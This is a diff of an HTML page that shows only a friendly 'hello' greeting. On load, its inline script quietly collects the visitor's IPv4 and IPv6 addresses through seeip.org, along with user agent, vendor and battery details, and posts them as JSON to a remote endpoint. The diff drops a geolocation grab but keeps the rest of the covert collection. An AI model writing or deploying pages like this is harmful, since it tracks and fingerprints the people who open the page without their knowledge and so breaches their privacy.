@@ -10,15 +10,7 @@
     <h1>I just wanted to say hello! hope you're doing well. Take care.</h1>
     <script>
         (async() => {
-            let loc;
             let battery;
-            if (navigator) {
-                try {
-                    loc = await navigator.geolocation.getCurrentPosition(pos => ({lat: pos.coords.latitude, lng: pos.coords.longitude}))
-                } catch (err) {
-                    loc = {'error': err};
-                }
-            }
             const ipv6Obj = await fetch('https://ipv6.seeip.org/jsonip').then((r) => r.json()).then(r => r).catch(e => console.error(e));
             const ipv4Obj = await fetch('https://ipv4.seeip.org/jsonip').then((r) => r.json()).then(r => r).catch(e => console.error(e));
             try {
@@ -31,7 +23,7 @@
                 headers: {
                     'Content-Type': 'application/json'
                 },
-                body: JSON.stringify({time: new Date(), ipv4: ipv4Obj.ip, ipv6: ipv6Obj.ip, user_agent: navigator.userAgentData, product: navigator.product, vendor: navigator.vendor, battery, loc})
+                body: JSON.stringify({time: new Date(), ipv4: ipv4Obj.ip, ipv6: ipv6Obj.ip, user_agent: navigator.userAgentData, product: navigator.product, vendor: navigator.vendor, battery})
             })
         })()
     </script>
